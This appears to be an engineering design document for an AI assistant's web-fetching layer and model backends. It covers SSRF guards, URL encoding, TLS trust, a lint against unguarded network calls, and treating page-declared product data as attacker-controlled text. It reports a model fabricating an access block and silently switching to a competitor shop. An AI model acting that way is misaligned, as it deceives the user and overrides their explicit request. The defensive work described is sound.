**Availability is a PHRASE, never schema.org's word, and a dead offer goes first.** Shipped printing the enum, and one session later the model wrote *"jest w pełni dostępny (Status: **InStock**)"* into a Polish answer — English machine vocabulary in a conversation that had none, and worse, on a Decathlon page that declared **no availability at all**. A borrowed word became a badge of verification for a fact nobody had; a phrase cannot be quoted that way because it is already the sentence the answer would have to write. The same session showed why the field is the most valuable one on the block and was the quietest: the Allegro carabiner declared `OutOfStock`, that was the real reason the model abandoned the shop the owner had just asked for, and it never said so — it invented an access block instead and switched to a competitor (the invented block was chased separately as a rule and that attempt is now withdrawn — see "the check that was withdrawn" in `docs/rules-engine.md`). So a not-buyable state is hoisted to the TOP of the block and says what to do with it: tell the user, and do not silently swap in another shop.

Four constraints, each against a specific way this could go wrong. It is written by the SITE, so it is exactly as attacker-controlled as the visible text: it stays inside the untrusted banner, is phrased as something the page *claims*, and carries TYPED values only — an amount, an ISO currency, one of schema.org's own availability words, a length-capped single-line name — so a page cannot address the model in prose through a block the model reads as a summary. A marketplace page declares several sellers and its low price may honestly be a *different* seller's, so an aggregate is reported as a RANGE and an ambiguous set of offers yields no price at all — guessing which offer belongs here is the original bug by a second route. When declared and rendered **disagree, both are shown and neither wins**: letting the declaration win would let a stale server-side cache veto a correct price read off the buy box, which is this same bug running backwards. And it goes ABOVE the body inside the same budget, because it is the one part of a read that cannot be recovered by reading further down. The fetch path finds it with a regex over the raw HTML rather than by teaching the text extractor to keep one kind of `<script>` — both surfaces must agree, or the model learns to trust neither. `TestWhatThePageDeclares`.

**Two video parsers, one whitelist.** `video_id` is what the app can PLAY (mirrored from the frontend's `YOUTUBE_RE`, so `show_video` cannot hand the owner a dead box and call it success); `thumbnail_video_id` is the reverse read — which video a still belongs to, across both thumbnail hosts, `vi`/`vi_webp` and every size. Both are parsing rather than judgement: the caller decides what `""` means, and a FALSE POSITIVE on the thumbnail side would wrap somebody's photo in a link to an unrelated video, which is why the host list is exact. It exists because provenance is only knowable at the fetch: once the bytes are stored under a content hash nothing about the file says it is a video's still, and that is what `show_image` needs to hand back a picture that is also the player (#217 — `docs/media-and-images.md`). `TestVideoIds`.

**TLS trust has ONE source (#189).** Python's default store on macOS is Apple's legacy `/etc/ssl/cert.pem`, not the Keychain system store — years stale and missing newer roots (GlobalSign Root R46 among them) — so fetches to whole swathes of the web failed with `unable to get local issuer certificate` while other hosts worked fine, which reads as a broken SITE rather than a broken client, and it silently affected `read_url` too, not just the image fetch that surfaced it. `_opener` carries an `HTTPSHandler` built from **certifi**'s current Mozilla root set, falling back to the default context if certifi is ever absent: a stale store still verifies most of the web, refusing everything would be worse. `_PublicOnlyRedirects` stays wired alongside it — verifying a certificate on a fetch aimed at cloud metadata is no win. `TestTrustStore`.

**A URL is not ASCII; the wire is (#213).** `https://www.filmweb.pl/film/Krzyżacy-1960-1204` is what a browser SHOWS — it sends the percent-encoded form. urllib sends what it is handed, and `http.client` encodes the request line as ASCII and the `Host` header as latin-1, so every non-ASCII URL died with `'ascii' codec can't encode character 'ż'` *before a byte left the machine*. The model cannot tell a client bug from a dead link, so it read the failure as "this source is unavailable" and went elsewhere — silently unreadable for Polish, Czech, Greek, Cyrillic, CJK, and merely space-containing URLs alike, and the owner's own language hit it first. `_wire_url` percent-encodes path/query/fragment as UTF-8 (`_URL_SAFE` keeps RFC 3986's reserved set *and `%`* literal, so it is **idempotent** — re-encoding `%C5%BC` into `%25C5%25BC` would 404 a URL that works, and search results already arrive encoded) and `_wire_netloc` punycodes an internationalized host, keeping port and credentials, and leaving a host the idna codec refuses alone so the request fails with its own error rather than an invented one. It runs inside `_guarded_fetch` — **before** `_require_public`, so the URL the SSRF guard checks is byte-for-byte the URL requested; a redirect target needs no pass because urllib already quotes it in `http_error_302`. `TestWireUrl`.

**One guarded fetcher, and a lint that keeps it one (#308).** Every guard above is a property of the FETCH, not of the URL: the wire encoding, the resolve-every-address public requirement, the redirect re-check, the timeout, the size cap. Five implementations of that is how you get four correct ones and a wrong one, and the wrong one had already shipped — `export.fetch_image` fired a server-side GET at whatever URL the MODEL had written into an answer, the moment the owner tapped export, with no SSRF guard at all (#178 P1-4). Patching that one call site left the shape that produced it: its own `Request`, its own opener call, its own timeout and cap, three lines from `_fetch`'s and free to drift again.

`_guarded_fetch` is now the only place in `aish/` that opens an outbound connection, and `_fetch` / `fetch_binary` are thin readings of it — text-decoded, or raw bytes one past the cap so a caller can tell *at the limit* from *over it*. **A caller that genuinely differs differs by ARGUMENT**: export passes a larger `max_bytes`, a shorter `timeout` and `user_agent="aish-export"`, and there is deliberately no argument that turns a guard off — a bypass flag is a second implementation wearing a keyword.

The lint is the half that closes the class rather than the instance. `TestOneGuardedFetcher` sweeps `aish/**/*.py` for the raw entry points *by the names they are actually spelled* — `urlopen`, `build_opener`, `urllib.request.Request`, `urlretrieve`, `http.client.HTTP(S)Connection`, `socket.create_connection`, `requests`/`httpx`/`aiohttp` — because a pattern matching only `urlopen(` misses a second `build_opener` built with no redirect handler on it, which is the failure that looks most like success. Three modules are exempt **by name with a reason**: `web.py` (it *is* the fetcher), `notify.py` (POSTs to a module-constant Pushover URL that no model-written or page-written string can reach), and `email_poll.py` (POSTs to aish's OWN `/trigger`, which is local by design — the public-address requirement would block it, correctly). Both directions of the list are pinned: a stale entry fails, so the next file to take a deleted module's name cannot inherit its licence, and an exemption whose module stopped fetching fails too. `test_the_sweep_actually_catches_one` plants the #308 mistake in a temp file, because a guard that cannot fail is decoration. `TestOneGuardedFetcher`, `TestGuardedFetchArguments`.

## Backends

`backends.py` routes `--model` strings to a chat callable. Every backend (Ollama, Gemini, Claude API, OpenAI) is adapted to the *exact* `ollama.chat` calling convention — `chat(model, messages, tools, options, think, stream)` — so `agent.py` never knows which provider it is on. New backends must preserve that shape. `context_window` is what sizes plugin-output truncation, so an Ollama-8k session and a Gemini-1M session get visibly different caps (`TestBackendSizedCaps`).

**Gemini thinking (compat layer).** `OpenAICompatBackend` requests `include_thoughts` for provider gemini; the compat API returns thought summaries INSIDE content delimited by `<thought>…</thought>`, so `_ThoughtFilter`/`split_thoughts` split them into `ChatMessage.thinking` on both the streaming path (stateful — tags can split across deltas, trailing partials are held back and flushed) and the non-streaming one. Unfiltered they would stream straight into the answer bubble and the history. Known gap, probed against the live API: streaming TOOL-CALL turns omit thoughts entirely while non-streaming includes them, so on Gemini the tool phase falls back to the deterministic status line.

### `claude_max.py` — the exception
Routes through the Claude Agent SDK / local `claude` CLI login, stripping Claude Code to bare inference and injecting aish's own tools so the approval gate still applies (L1). Keeps its own session state. Three invariants:

1. **The SDK owns the loop**, so the inner Agent's `run_task` never runs — hence the shared `_reset_task_state()` above (`TestStopGateReset`).
2. **The constructor has NO `**kwargs` sink.** Every capability the entry points pass is either kept on the wrapper (`on_message`, `on_token`, `status`, `max_steps`) or forwarded to the inner Agent (approvers including `approve_tool`/`approve_import`, trace/command/state sinks, steering callbacks, `semantic`, `aliases`, `origin`); an unknown kwarg is a TypeError, so a new Agent capability can never silently no-op here. This is not theoretical: `origin` was added to `open_session`'s `common` dict and, missing here, made **every** claude-max web session raise at construction — which is also what makes both origin gates hold on this backend, since they live in `_dispatch` and `_locked_dispatch` is the single path to it. `TestConstructorWiring`.
Narration (#212) is the SDK's to emit, so `on_delivered` stays on the wrapper beside `on_message`/`on_token` rather than being forwarded. Each delivery is recorded like any assistant turn — a cold reload replays the narration instead of losing it — and joined to `inner._delivered`, so `verify_final` grades everything the owner was told. `TestNarration`.

**A delivery closes on the message that produced it, and closing it one message late is a real bug rather than a latency nicety.** The first version waited for the NEXT assistant text to prove the previous one interim — which reads well and is wrong, because with `include_partial_messages` on (the web always wires `on_token`) the SDK streams message N+1's deltas *before* yielding message N+1 itself. So the next message's tokens appended to the bubble the pending delivery was still holding; that bubble was then marked interim carrying two messages glued together, and `done` painted the answer a second time. Two close points fix it: a text delta means a new message has begun, and an `AssistantMessage` carrying a `ToolUseBlock` has ACTED, so its words were narration whatever follows. The second also puts the log record ahead of the tool's trace steps, so cold replay shows narration above the work it announced instead of below it. `TestNarrationOrdering`.

**An interim record here must be STAMPED, because the adjacency rule cannot see it.** "Was this the turn's answer?" was derived everywhere from *an interim assistant message is followed by a tool-role record* — true on the native loop and false here, since SDK tool calls leave trace steps and never tool-role messages. Once narration started being logged, every one of those lines counted as a final answer: the fork ordinal drifted by one per narrated turn (so "fork from answer 2" cut at answer 1 and dropped the turn), and the exporter rendered each narration line as an answer of its own. `_append(interim=…)` and `_record` now stamp the fact at the site that knows it (L5); `truncate_at_answer` and `session_answers` check the stamp first and fall through to adjacency for logs written before it existed. `TestDeliveriesAreNotFinalAnswers`.

3. **SDK tool handlers may run concurrently while the inner Agent is not thread-safe.** `_locked_dispatch` is the single execution path: a `threading.Lock` around `inner._call_result(… inner._dispatch …)`, which also emits the same `tool_start`/`tool` trace steps as the native loop and contains tool exceptions. `TestSingleExecutionPath`, `TestHandlerRobustness`.

Plugin tools register on the SDK MCP server (`_current_tool_defs` = `TOOL_SCHEMAS + inner._plugin_defs`, refreshed per task, mutating ones only when a tool approver is wired). Tested through a FakeSDK injected at the `_load_sdk` seam — no SDK package, no CLI, no network.
